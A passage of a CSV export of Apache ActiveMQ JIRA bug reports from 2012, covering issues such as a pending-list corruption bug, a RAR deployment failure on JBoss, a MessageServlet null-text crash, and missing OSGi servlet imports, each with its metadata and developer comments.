Pending transactions are visible via jmx so that they can be forced.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Problem in OrderPendingList can lead to message not being deliver after durable sub reconnect.,AMQ-3871,12558795,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,31/May/12 15:03,02/May/13 02:29,14/Jul/23 05:43,31/May/12 18:25,5.5.1,5.6.0,,,,5.7.0,,,Broker,,,,0,,,,,,,,,the addMessageFirst method in OrderPendingList can lead to corruption of the linked list causing iterators to not traverse all the pending messages in the non-persistent message list when a durable sub reconnects and keepDurableSubsActive is enabled (default value).  ,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3998,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249821,,,Thu May 31 18:25:46 UTC 2012,,,,,,,,,,,"0|i0ahpj:",59142,,,,,,,,,,,,,,,,,,,,,"31/May/12 18:25;tabish;Fixed problems in OrderedPendingList which is used by PrioritizedPendingList and the cursors.  Added test cases to cover the pending list types and a Durable subscriber test to show the issue with the non-persistent messages not getting delivered as expected after reconnect when keepDurableSubsActive=true.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ 5.6 - RAR deployment is not working on JBoss6,AMQ-3868,12558569,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,davsclaus,rjtokenlanring,rjtokenlanring,30/May/12 09:44,19/Sep/12 11:27,14/Jul/23 05:43,19/Sep/12 11:27,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"Upgrading rar deployment on jboss 6 from 5.5 to 5.6 produce multiple errors due to new introduced dependencies. Major problems are on guava libraries and jaxson.
RAR file provided with release is producing the following errors, blocking the AS startup (see attachments).",Windows 7 / Centos 5 either 32 and 64 bit,davsclaus,rjtokenlanring,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/May/12 09:45;rjtokenlanring;boot.log;https://issues.apache.org/jira/secure/attachment/12530181/boot.log","30/May/12 09:45;rjtokenlanring;exceptions.txt;https://issues.apache.org/jira/secure/attachment/12530182/exceptions.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249719,,,Wed Sep 19 11:27:59 UTC 2012,,,,,,,,,,,"0|i0agof:",58975,Regression,,,,,,,,,,,,,,,,,,,,"08/Sep/12 09:01;davsclaus;Have you tried JBoss AS 6.1.0? From the log it seems an issue with the deployer in JBossAS that cannot load Guava, also as you mention.;;;","08/Sep/12 09:19;davsclaus;You can also try to repackage the activemq-rar-5.6.0.rar file and remove the JAR files that causes problems. Some of the JARs is optional and only needed for special features.;;;","19/Sep/12 11:27;davsclaus;This is fixed in 5.7.0 as the RAR has been trimmed to not include leveldb and other stuff that isn't needed out of the box.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unable to delete messages whose original destination is virtual topic from web console,AMQ-3867,12558533,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,rajdavies,wangyin,wangyin,30/May/12 03:34,08/Jun/12 16:53,14/Jul/23 05:43,08/Jun/12 16:53,5.5.0,5.5.1,,,,5.7.0,,,,,,,0,,,,,,,,,"When delete messages  whose original destination is virtual topic, you will find that the name of destination is still original virtual topic name, not the actual queue name, this cause broker unable to find the actual queue so no messages can be deleted successfully.",,rajdavies,wangyin,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/May/12 03:34;wangyin;browse.jsp.patch;https://issues.apache.org/jira/secure/attachment/12530152/browse.jsp.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249822,,,Fri Jun 08 16:53:14 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahpr:",59143,,,,,,,,,,,,,,,,,,,,,"08/Jun/12 16:53;rajdavies;patch applied in SVN  revision 1348150;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AjaxTest fails all tests due to line ending differences,AMQ-3865,12558461,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,giles7777,giles7777,29/May/12 17:25,31/May/12 21:07,14/Jul/23 05:43,31/May/12 21:07,5.6.0,,,,,5.7.0,,,Test Cases,,,,0,,,,,,,,,"The tests do index of comparison of ""foo\n"" where on windows you'd need to do ""foo\r\n"".  I don't think the line endings are really significant to test.  

If they are then I can change the test over to check the operating system and add carriage returns if necessary.  ",Windows,giles7777,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/May/12 17:26;giles7777;AjaxTest_new.java;https://issues.apache.org/jira/secure/attachment/12530065/AjaxTest_new.java","29/May/12 17:25;giles7777;amq-3865.patch;https://issues.apache.org/jira/secure/attachment/12530064/amq-3865.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249823,,,Thu May 31 21:07:33 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahpz:",59144,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"29/May/12 17:26;giles7777;complete file in case linefeed/carriage return differences are hard to spot.  ;;;","31/May/12 21:07;tabish;Patch applied with thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
XA session is returned twice to the pool,AMQ-3863,12558315,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,28/May/12 08:48,28/May/12 09:29,14/Jul/23 05:43,28/May/12 09:29,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,Once on afterCompletion() and once on regular close() this leads to pool exhaustion.,,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249824,,,Mon May 28 09:29:40 UTC 2012,,,,,,,,,,,"0|i0ahq7:",59145,,,,,,,,,,,,,,,,,,,,,"28/May/12 09:29;dejanb;A fix committed with svn revision 1343171;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failure to resolve local jmx url for sunJvm can result in npe,AMQ-3858,12557024,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,23/May/12 15:53,23/May/12 19:32,14/Jul/23 05:43,23/May/12 19:32,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"calls to ./bin/activemq restart can result in this NPE which is ugly. It should fallback to the default jmxurl in this case.
{code}Connecting to pid: 47706
ERROR: java.lang.NullPointerException
java.lang.NullPointerException
at javax.management.remote.JMXServiceURL.<init>(JMXServiceURL.java:122)
at org.apache.activemq.console.command.AbstractJmxCommand.handleOption(AbstractJmxCommand.java:350)
at org.apache.activemq.console.command.ShutdownCommand.handleOption(ShutdownCommand.java:156)
at org.apache.activemq.console.command.AbstractCommand.parseOptions(AbstractCommand.java:73)
at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:45)
at org.apache.activemq.console.command.AbstractJmxCommand.execute(AbstractJmxCommand.java:380)
at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:148)
at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:90)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at org.apache.activemq.console.Main.runTaskClass(Main.java:257)
at org.apache.activemq.console.Main.main(Main.java:111)
{code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249827,,,Wed May 23 19:32:38 UTC 2012,,,,,,,,,,,"0|i0ahqv:",59148,,,,,,,,,,,,,,,,,,,,,"23/May/12 19:32;gtully;fix in http://svn.apache.org/viewvc?rev=1341945&view=rev

if we cannot resolve the local pid jmxurl we fallback to the default or --jmxurl;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MessageServlet get messages does not return JMS Message Properties,AMQ-3857,12556942,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,giles7777,giles7777,23/May/12 00:22,24/Sep/12 21:05,14/Jul/23 05:43,31/May/12 20:58,5.5.0,5.6.0,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"When using GET to get a message it does not return any of the JMS message properties.

I can easily see how to add that code, but I'm not sure what the correct way to return them is.  They could go into the response headers via setResponseHeaders or the returned XML format could be changed to support properties and the header.  Sadly this would likely break most existing clients.  

We'd like to use the REST API to enable some web clients to fully participate in a messaging system that is primarily Java based.  

If we can come to agreement on how we want to return properties then I'd be happy to code up a patch.  ",,giles7777,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,21600,21600,,0%,21600,21600,,,,,,,,AMQ-4072,,,,,,,,,,,,,,,,,,,,,,,,,,"28/May/12 20:15;giles7777;amq-3857.patch;https://issues.apache.org/jira/secure/attachment/12529989/amq-3857.patch","28/May/12 20:12;giles7777;amq-3857.patch;https://issues.apache.org/jira/secure/attachment/12529987/amq-3857.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249828,,,Thu May 31 20:58:11 UTC 2012,,,,,,,,,,,"0|i0ahr3:",59149,,,,,,,,,,,,,,,,,,,,,"28/May/12 20:04;giles7777;Looking around I see that HornetQ has a REST api as well.  They return the JMS property values as headers.  This looks reasonable to me and shouldn't break any existing clients using this api.  I'll attach a proposed change to support this.;;;","28/May/12 20:12;giles7777;Patch for including JMS properties into the response headers.  ;;;","28/May/12 20:15;giles7777;junit test confirming header delivery of JMS properties.  ;;;","31/May/12 20:58;tabish;Using the response headers seems sensible.  Applied the patch and supplied test case, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MessageServlet assumes TextMessages contain Text,AMQ-3856,12556929,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,giles7777,giles7777,22/May/12 21:56,29/May/12 14:21,14/Jul/23 05:43,29/May/12 14:21,5.5.1,5.6.0,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"writeMessageResponse assumes that a text message will contain non null text.  It does a txt.startsWith which crashes with TextMessages with no body.

It can be fixed with this code:

    protected void writeMessageResponse(PrintWriter writer, Message message) throws JMSException, IOException {
        if (message instanceof TextMessage) {
            TextMessage textMsg = (TextMessage)message;
            String txt = textMsg.getText();
            
            if (txt != null) {
                if (txt.startsWith(""<?"")) {
                    txt = txt.substring(txt.indexOf(""?>"") + 2);
                }
                writer.print(txt);
            }
        } else if (message instanceof ObjectMessage) {
            ObjectMessage objectMsg = (ObjectMessage)message;
            Object object = objectMsg.getObject();
            writer.print(object.toString());
        }
    }",all,donnchadh,giles7777,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/May/12 19:10;giles7777;amq-3856.patch;https://issues.apache.org/jira/secure/attachment/12529983/amq-3856.patch","28/May/12 19:38;giles7777;amq-3856_junit.patch;https://issues.apache.org/jira/secure/attachment/12529985/amq-3856_junit.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249829,,,Tue May 29 14:21:19 UTC 2012,,,,,,,,,,,"0|i0ahrb:",59150,,,,,,,,,,,,,,,,,,,,,"25/May/12 13:32;tabish;Fixed in trunk, also added checks for the ObjectMessage case.;;;","28/May/12 16:12;giles7777;Thanks for the fix.  There is one other place that needs it.  writeResponse in MessageServlet.java needs the same fix.  ;;;","28/May/12 16:13;giles7777;The same change is needed in MessageServlet.  The fix was applied to MessageListenerServlet which also needed it.  ;;;","28/May/12 16:40;tabish;Recommend you supply some patches and even better tests for the issues you are seeing.;;;","28/May/12 16:50;giles7777;Patches are easy I'll get those together.  Best I can tell the activemq-web module does not contain any junit tests?  or at least the src/test directory doesn't exist as in other modules.  Fairly new to coding in ActiveMQ so perhaps they are located some place else?

It's possible the right place for these tests is in activemq-web-demo/src/test?  I see some reading tests but no POST requests.  If that's the right place then I'll work up some POST examples.  

I've confirmed that's the right place for the tests and have developed a test showing the problem.  I'll attach the diff.;;;","28/May/12 19:10;giles7777;Patch for writeMessageResponse change;;;","28/May/12 19:12;giles7777;I could not get a junit file to trigger this but I know I ran into it from a webclient before.  Best I can tell it could only happen when sync=true or a continuation is true on a getMessage.  The code is same changes made to MessageListenerServlet;;;","28/May/12 19:38;giles7777;Add's testPost test that shows crash on empty text messages.  ;;;","28/May/12 19:38;giles7777;ok, I figured out how I was getting the crash.  It was on the consume side of a message with no text. Junit added, fix fixes crashing junit.  ;;;","29/May/12 14:21;tabish;Applied the patch and unit tests, thanks for the contribution.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT doesn't translate wildcards to ActiveMQ wildcards,AMQ-3855,12556874,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rajdavies,rajdavies,22/May/12 15:21,23/May/12 10:27,14/Jul/23 05:43,22/May/12 15:23,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"Currently, subscribing to ActiveMQ JMS messages over MQTT won't work if you do foo/+ you would expect to receive a JMS or STOMP message sent to foo.bar.",,rajdavies,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249830,,,Wed May 23 10:27:05 UTC 2012,,,,,,,,,,,"0|i0ahrj:",59151,,,,,,,,,,,,,,,,,,,,,"22/May/12 15:23;rajdavies;Fixed by:
Subversion: Committed revision 1341521.;;;","23/May/12 10:27;rajdavies;And added additional fixes on Topic to prevent duplicates being sent if a wild card is used:
Subversion: Committed revision 1341820.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Referencing old spring xsd in configuration files,AMQ-3854,12556698,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,21/May/12 15:21,21/May/12 16:20,14/Jul/23 05:43,21/May/12 16:20,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"Just noticed that we still reference 

http://www.springframework.org/schema/beans/spring-beans-2.0.xsd

in config files although we upgraded to 3.x",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249831,,,Mon May 21 16:20:20 UTC 2012,,,,,,,,,,,"0|i0ahrr:",59152,,,,,,,,,,,,,,,,,,,,,"21/May/12 16:20;dejanb;Fixed with svn revision 1341091;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing import in activemq-web-console,AMQ-3853,12556621,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,geerzo,geerzo,20/May/12 23:35,10/Sep/12 09:01,14/Jul/23 05:43,10/Sep/12 09:01,5.6.0,,,,,5.7.0,,,,,,,1,,,,,,,,,"Running activemq-web-console in Karaf generates these errors:

Caused by: java.lang.ClassNotFoundException: javax.servlet.ServletContextListener not found by org.apache.activemq.activemq-web-console [118]

Caused by: java.lang.ClassNotFoundException: javax.servlet.Filter not found by org.apache.activemq.activemq-web-console [118]

Caused by: java.lang.ClassNotFoundException: javax.servlet.http.HttpServlet not found by org.apache.activemq.activemq-web-console [118]

It looks like activemq-web-console imports the following servlet packages:

        javax.servlet.jsp;version=""[2.1,3)"",
	javax.servlet.jsp.el;version=""[2.1,3)"",
	javax.servlet.jsp.tagext;version=""[2.1,3)"",

So it seems to be missing imports for:

javax.servlet
javax.servlet.http
",,ceposta,davsclaus,dejanb,gcollins,geerzo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/May/12 00:39;ceposta;exclude-servlet-api.patch;https://issues.apache.org/jira/secure/attachment/12528680/exclude-servlet-api.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249832,,,Mon Sep 10 09:01:17 UTC 2012,,,,,,,,,,,"0|i0ahrz:",59153,,,,,,,,,,,,,,,,,,,,,"21/May/12 10:32;dejanb;Hi,

do you have war feature installed, like

{code}features:install war{code}

That should do the trick. See more info at

http://activemq.apache.org/osgi-integration.html#OSGiIntegration-WebConsole;;;","21/May/12 15:51;geerzo;Dejan,

I do have war installed. The packages in question are being exported just fine from the org.ops4j.pax.web.pax-web-runtime bundle, the problem is they aren't being imported into the activemq-web-console bundle as far as I can see. Maybe I'm missing something but that looks like the problem.

Chris;;;","22/May/12 15:41;dejanb;Thanks Chris, just confirmed it. I'll try to fix it soon. In the meantime you can trying using 5.5.0 console, they should be the same in functionality.;;;","22/May/12 16:34;ceposta;Dejan,
Seems to be an issue with changes in the maven-bundle-plugin. activemq-5.6.0 is using v2.3.5 of the plugin which seems to not include the javax.servlet and javax.servlet.http packages, while the older version of the plugin, v2.1.0 which is used by the 5.5.x builds correctly populates the manifest with aforementioned packages. v2.2.0 of the plugin also works.;;;","23/May/12 00:38;ceposta;Here's my research:

Indeed there were multiple changes in the maven-bundle-plugin to take advantage of the newer versions of the bnd tool that underlies the maven-bundle-plugin, but none of those changes were what cause this error. 

The bnd tool will not add imports for packages it sees within the bundle. To make it a short story, some transitive dependencies of the 5.6.0 activemq-core were including the servlet-api (and thus were part of the bundle) which explains why the bundle plugin wasn't adding the javax.servlet and javax.servlet.http packages.

In the activemq-web-console's pom.xml file, you see the following:

{quote}
            <Embed-Dependency>*;scope=compile|runtime</Embed-Dependency>
            <Embed-Transitive>true</Embed-Transitive>
{quote}

And if you follow the dependency tree for 

{quote}
    <dependency>
      <groupId>${project.groupId}</groupId>
      <artifactId>activemq-core</artifactId>
    </dependency>
{quote}

you'll see the two instances of the servlet spec within the transitive deps:

{quote}
mvn dependency:tree | grep servlet
{quote}

You'll see that although the geronimo servlet spec has ""provided"" scope, the other two (transitives from fusemq-leveldb->hadoop-core) have ""compile"" scope and will be included in the WEB-INF/lib directory of the bundle. Thus when bnd tries to determine whether to add the appropriate packages, it decides not to since they're already on the class path.

There are two options to fix:
1) add the javax.servlet and javax.servlet.http to the <Import-Package> instructions to the bundle plugin. This just kinda glosses over the fact that the servlet api is being included
or
2) exclude the servlet api from the activemq-core transitive dependencies.

I would suggest the second approach. I've added this patch.
Let me know if I didn't explain something clear.
Christian


Patch is attached.;;;","23/May/12 09:56;dejanb;Thanks Christian, great work. Patch applied with svn revision 1341810. I'm not resolving this issue yet as I want to take this opportunity and create a pax-exam test for amq features (something we want to do for a long time). I'll try to get to it soon, but if any of you have time and want to do it, please do.;;;","23/May/12 21:47;ceposta;I'll find some time. Would be an interesting exercise.;;;","08/Sep/12 09:39;davsclaus;Dejan, could you create a new ticket about the test, and mark this as resolved for 5.7. Its good to have this in the release notes for 5.7 as being fixed.;;;","10/Sep/12 09:01;dejanb;Done. New Jira for integration testing is https://issues.apache.org/jira/browse/AMQ-4034;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stomp transport allows durable topic subscriber to subscribe to a queue,AMQ-3852,12556606,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,jmkgreen,jmkgreen,20/May/12 19:23,12/Jun/12 14:53,14/Jul/23 05:43,12/Jun/12 14:53,5.5.0,,,,,5.7.0,,,STOMP,,,,0,,,,,,,,,"See also AMQ-2879 the stack-trace to which recently re-emerged in our production logs. The issue was traced to a developer having copy-pasted some PHP script that created a durable topic subscriber but in his clone he subscribed to a queue not a topic. He wasn't to know...

Question is how to prevent clients getting into this situation. Can the transport disconnect the client and log an error to the console, or must it allow the connection, potentially lulling the client developer into a false sense of functioning code?

Might also want to review the documentation and potentially the header names to prevent future confusion.",,jmkgreen,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249833,,,Tue Jun 12 14:53:09 UTC 2012,,,,,,,,,,,"0|i0ahs7:",59154,,,,,,,,,,,,,,,,,,,,,"21/May/12 12:54;tabish;Recommend you create a test case and attach it to demonstrate your issue.;;;","12/Jun/12 14:53;tabish;Fix applied in trunk along with a test case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Infinite TemqQueue advisory messages,AMQ-3851,12556454,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,chrisdrobison,chrisdrobison,18/May/12 20:58,04/Oct/12 11:40,14/Jul/23 05:43,04/Oct/12 11:40,5.6.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"I'm seeing a behavior that looks like a race condition of some kind. I have two brokers (MSSD5D101, MSTMIP103). MSSD5D101 has a duplex network connector connecting it to MSTMIP103. The two machines are in different US states so there is a VPN in between. I have two consumer services that reply to queued messages. One consumer (WISD5P101) connects to MSSD5D101 and the other consumer (POSD5P101) connects to MSTMIP103. I also have a web portal that sends messages out to different queues expecting a response. The web portal, and two consumers are all .NET based. 

What is happening is that after some number of messages, something goes crazy and floods the network of brokers with advisory messages pertaining to temp queues being added or removed. By restarting one or the other of the ActiveMQ servers, things return to normal. But, while the flood is happening, one of the machines will be at 100% CPU and become worthless. I will be attaching logs and some code that I'm using to interact with ActiveMQ.",,chrisdrobison,dejanb,lionel.cons,mbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/May/12 21:01;chrisdrobison;ActiveMqMessagingProvider.cs;https://issues.apache.org/jira/secure/attachment/12528149/ActiveMqMessagingProvider.cs","18/May/12 21:01;chrisdrobison;ActiveMqRequestReceiver.cs;https://issues.apache.org/jira/secure/attachment/12528150/ActiveMqRequestReceiver.cs","18/May/12 20:59;chrisdrobison;Log.zip;https://issues.apache.org/jira/secure/attachment/12528146/Log.zip","18/May/12 21:14;chrisdrobison;mssd5d101-activemq.xml;https://issues.apache.org/jira/secure/attachment/12528158/mssd5d101-activemq.xml","18/May/12 21:14;chrisdrobison;mstmip103-activemq.xml;https://issues.apache.org/jira/secure/attachment/12528159/mstmip103-activemq.xml","30/May/12 19:42;chrisdrobison;run-2012-05-30.snapshot;https://issues.apache.org/jira/secure/attachment/12530260/run-2012-05-30.snapshot","18/May/12 21:09;chrisdrobison;web-portal-code-snippet.cs;https://issues.apache.org/jira/secure/attachment/12528153/web-portal-code-snippet.cs",,,,,,,,,,,,,,,7.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,240022,,,Thu Oct 04 11:40:14 UTC 2012,,,,,,,,,,,"0|i00vin:",3038,,,,,,,,,,,,,,,,,,,,,"18/May/12 